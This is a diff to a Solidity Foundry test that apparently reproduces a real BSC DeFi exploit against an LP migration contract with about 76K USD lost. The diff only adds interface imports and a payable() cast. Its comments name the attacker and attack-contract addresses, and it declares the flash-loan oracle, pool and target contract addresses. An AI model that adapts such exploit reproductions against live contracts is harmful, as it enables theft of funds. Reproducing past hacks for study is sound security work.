@@ -3,6 +3,14 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
+import {IDPPOracle} from "src/interfaces/IDPPOracle.sol";
+import {IPancakeV3Pool} from "src/interfaces/IPancakeV3Pool.sol";
+
+import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
+import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
+import {IPancakePair} from "src/interfaces/IPancakePair.sol";
+
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
 // @KeyInfo - Total Lost : ~76K USD$
 // Attacker - https://bscscan.com/address/0x2525c811ecf22fc5fcde03c67112d34e97da6079
 // Attack contract - https://bscscan.com/address/0x1e2a251b29e84e1d6d762c78a9db5113f5ce7c48
@@ -37,7 +45,7 @@ contract ContractTest is Test {
 
     IDPPOracle DPPOracle = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
     IPancakeV3Pool PancakePool = IPancakeV3Pool(0xA2C1e0237bF4B58bC9808A579715dF57522F41b2);
-    IUniswapV2Router Router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    IUniswapV2Router Router = IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
     IUniswapV2Pair CELL9 = IUniswapV2Pair(0x06155034f71811fe0D6568eA8bdF6EC12d04Bed2);
     IPancakePair PancakeLP = IPancakePair(0x1c15f4E3fd885a34660829aE692918b4b9C1803d);
     ILpMigration LpMigration = ILpMigration(0xB4E47c13dB187D54839cd1E08422Af57E5348fc1);
